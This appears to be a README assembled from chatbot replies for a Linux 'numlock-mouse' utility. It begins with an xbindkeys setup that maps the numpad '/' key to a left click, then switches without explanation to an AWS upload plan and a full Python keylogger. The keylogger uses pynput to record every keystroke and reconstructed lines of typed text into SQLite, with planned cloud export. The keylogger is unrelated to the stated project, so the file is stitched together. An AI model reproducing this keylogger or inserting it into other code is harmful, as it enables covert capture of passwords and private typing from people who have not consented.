# [numlock-mouse](https://chatgpt.com/share/681e05a6-bb84-8011-ba20-9dbc7aa64f10)

[Mouse Movement Reference](https://pynput.readthedocs.io/en/latest/mouse.html#monitoring-the-mouse)
[Keyboard Movement Reference](https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard)

This software enables mouseclicks from the numpad on a keyboard when the numlock is not enabled

✅ Complete Proof-of-Concept (PoC)
Step 1: Install Dependencies

sudo apt update
sudo apt install xbindkeys xdotool

Step 2: Create Configuration File for xbindkeys

If it doesn't exist yet:

xbindkeys --defaults > ~/.xbindkeysrc

Step 3: Edit ~/.xbindkeysrc to Bind / to Left Click

Add this block to the end of your ~/.xbindkeysrc file:

# Send left click on '/' key (only when Num Lock is off)

"bash -c 'if [[$(xset q | grep "Num Lock" | awk \"{print \\$8}\") == \"off\"]]; then xdotool click 1; fi'"
KP_Divide

Explanation:

    KP_Divide is the key symbol for the numeric keypad /.

    xset q | grep "Num Lock" checks the Num Lock state.

    xdotool click 1 simulates a left click.

    The command only executes if Num Lock is off.

Step 4: Start xbindkeys

xbindkeys

To run it automatically at startup, you can add xbindkeys to your .xinitrc or desktop environment’s autostart applications.
Step 5: Optional: Make a Systemd Service (Headless Startup)

Create this file:

nano ~/.config/systemd/user/xbindkeys.service

Paste this content:

[Unit]
Description=Start xbindkeys

[Service]
ExecStart=/usr/bin/xbindkeys
Restart=on-failure

[Install]
WantedBy=default.target

Then enable it:

systemctl --user enable --now xbindkeys

Would you like to map this to a different key or make the mouse move too?

---

✅ AWS Future Plan

When ready, we will:

    Replace SQLite with Amazon RDS (MySQL or PostgreSQL) or Amazon DynamoDB

    Upload logs from local SQLite to Amazon S3 encrypted buckets using KMS

    Use IAM roles and Cognito if needed to secure uploads without exposing keys

I can prepare you a Docker + systemd + AWS-ready setup later.

Would you like me to help you:

    Encrypt your SQLite database itself?

    Add a systemd service now for persistent background operation?

    Add a CLI tool to decrypt specific date ranges or export to CSV?

Let me know your next step.

---

Keylogging Extension

Goals Recap

    Capture keystrokes in real-time with timestamps.

    Store both individual keystrokes and combined text strings for later analysis.

    Use a secure local database (SQLite for POC).

    Design modular code to allow easy connection to a free-tier AWS storage (like S3 or DynamoDB).

    Maintain real-time nature for data insertion and retrieval.

Solution Overview

    SQLite local database for secure, low-latency local storage.

    Tables:

        keystrokes: stores every key event with timestamp.

        text_strings: stores combined text strings (like words or lines) with timestamps.

    Modular design: Database operations separated into a class/module.

    Background thread to batch or handle text string formation while logging keystrokes in real-time.

    Prepared for easy AWS integration by abstracting DB write operations (can later replace or extend with AWS SDK calls).

```python

import os
import sqlite3
from datetime import datetime
from threading import Thread, Lock
from pynput import keyboard

# --- Configurable Database Path from environment variable ---
db_path = os.getenv("KEYLOGGER_DB_PATH", "keylogger.db")
os.makedirs(os.path.dirname(db_path), exist_ok=True) if os.path.dirname(db_path) else None

# --- Database Handling Class ---
class KeyLoggerDB:
    def __init__(self, db_file):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.lock = Lock()
        self.create_tables()

    def create_tables(self):
        with self.lock:
            c = self.conn.cursor()
            c.execute('''
                CREATE TABLE IF NOT EXISTS keystrokes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    key TEXT NOT NULL,
                    timestamp TEXT NOT NULL
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS text_strings (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    text TEXT NOT NULL,
                    timestamp TEXT NOT NULL
                )
            ''')
            self.conn.commit()

    def insert_keystroke(self, key):
        with self.lock:
            timestamp = datetime.utcnow().isoformat()
            self.conn.execute('INSERT INTO keystrokes (key, timestamp) VALUES (?, ?)', (key, timestamp))
            self.conn.commit()

    def insert_text_string(self, text):
        with self.lock:
            timestamp = datetime.utcnow().isoformat()
            self.conn.execute('INSERT INTO text_strings (text, timestamp) VALUES (?, ?)', (text, timestamp))
            self.conn.commit()

    def close(self):
        self.conn.close()


# --- Text Buffer Manager for combined text strings ---
class TextBufferManager:
    def __init__(self, db):
        self.db = db
        self.buffer = []
        self.lock = Lock()

    def add_key(self, key):
        with self.lock:
            if key == "ENTER":
                # commit buffer as a string then clear
                if self.buffer:
                    combined = ''.join(self.buffer)
                    self.db.insert_text_string(combined)
                    self.buffer.clear()
            elif key == "BACKSPACE":
                if self.buffer:
                    self.buffer.pop()
            else:
                # Append normal characters
                self.buffer.append(key)

    def flush(self):
        with self.lock:
            if self.buffer:
                combined = ''.join(self.buffer)
                self.db.insert_text_string(combined)
                self.buffer.clear()


# --- Listener for keyboard events ---
def start_keylogger(db):
    buffer_manager = TextBufferManager(db)

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                k = key.char
            else:
                # Special keys
                k = key.name.upper() if hasattr(key, 'name') else str(key)
        except AttributeError:
            k = str(key)

        db.insert_keystroke(k)
        buffer_manager.add_key(k)

    def on_release(key):
        if key == keyboard.Key.esc:
            # Flush any buffered text before exit
            buffer_manager.flush()
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    db = KeyLoggerDB(db_path)
    print(f"Keylogger started. Press ESC to stop. Logging to {db_path}")
    try:
        start_keylogger(db)
    finally:
        db.close()
        print("Keylogger stopped and database closed.")
```

---
